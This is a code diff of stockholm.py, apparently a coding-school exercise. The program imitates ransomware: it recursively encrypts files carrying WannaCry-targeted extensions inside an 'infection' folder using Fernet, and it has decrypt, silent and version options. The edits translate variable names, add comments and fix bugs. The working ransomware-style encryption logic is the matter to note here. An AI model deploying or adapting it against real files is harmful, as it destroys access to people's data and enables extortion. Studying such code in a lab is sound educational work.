@@ -5,10 +5,19 @@ import io
 import cryptography
 from cryptography.fernet import Fernet
 
+# PROBLEM: Create a program called stockholm.py that encrypts and decrypts all the files inside the infection folder.
+# The encryption only must affect the files with the extensions which was been afected by WannaCry.
+# Without arguments, the program must encrypt the files.
+# '-r' or '--reverse' argument must decrypt the files with the key passed as argument.
+# '-v' or '--version' argument must show the program version.
+# '-s' or '--silent' argument must not show anything in the console.
+# '-h' or '--help' argument must show the help message.
+
+# Dummy output class to avoid printing anything to the console
 class NothingOutput(io.StringIO):
     def write(self, x): pass
 
-extensiones_cifrar = ['.der', '.pfx', '.key', '.crt', '.csr', '.p12', '.pem', '.odt',
+extensions_to_encrypt = ['.der', '.pfx', '.key', '.crt', '.csr', '.p12', '.pem', '.odt',
 					  '.ott', '.sxw', '.stw', '.uot', '.3ds', '.max', '.3dm', '.ods', '.ots', '.sxc',
 					  '.stc', '.dif', '.slk', '.wb2', '.odp', '.otp', '.sxd', '.std', '.uop', '.odg',
 					  '.otg', '.sxm', '.mml', '.lay', '.lay6', '.asc', '.sqlite3', '.sqlitedb', '.sql',
@@ -30,13 +39,14 @@ extensiones_cifrar = ['.der', '.pfx', '.key', '.crt', '.csr', '.p12', '.pem', '.
 def encrypt(path, key):
     print("Encrypting files into a folder...🔑")
     try:
+        # Walk through all the files and folders inside the path, recursively encrypting the files
         for root, dir, files in os.walk(path):
             for dirs in dir:
                 encrypt(os.path.join(root, dirs), key)
             for file in files:
                 name, extension = os.path.splitext(file)
                 # Encrypt only the files with the extensions in the list
-                if extension.lower() in extensiones_cifrar:
+                if extension.lower() in extensions_to_encrypt:
                     file_path = os.path.join(root, file)
                     with open(file_path, "rb") as file_obj:
                         content = file_obj.read()
@@ -55,11 +65,13 @@ def encrypt(path, key):
 def decrypt(path, key):
     print("Decrypting files...🔐")
     try:
+        # Walk through all the files and folders inside the path, recursively decrypting the files
         for root, dir, files in os.walk(path):
             for dirs in dir:
                 decrypt(os.path.join(root, dirs), key)
             for file in files:
-                name, extension = os.path.splitext(file)         
+                name, extension = os.path.splitext(file)
+                # Decrypt only the files with the .ft extension         
                 if extension.lower() == ".ft":
                     file_path = os.path.join(root, file)
                     with open(file_path, "rb") as file_obj:
@@ -70,9 +82,8 @@ def decrypt(path, key):
                         file_obj.write(encrypted_content)
                     
                     # Rename the decrypted file with the original extension
-                    if extension.lower() == ".ft":
-                        os.rename(file_path, file_path[:-3])
-                        print("🟢 File decrypted: " + file_path)
+                    os.rename(file_path, file_path[:-3])
+                    print("🟢 File decrypted: " + file_path)
     except Exception as e:
         print("🔴 ERROR decrypting the files: ", e)
 
@@ -82,7 +93,7 @@ def main():
     key = Fernet.generate_key()
     
     with open('key.txt', 'wb') as key_file:
-        key_file.write(key + '\n')
+        key_file.write(key + b'\n')
     
     # List of parse arguments
     parser = argparse.ArgumentParser(description='Encrypt/Decrypt files')
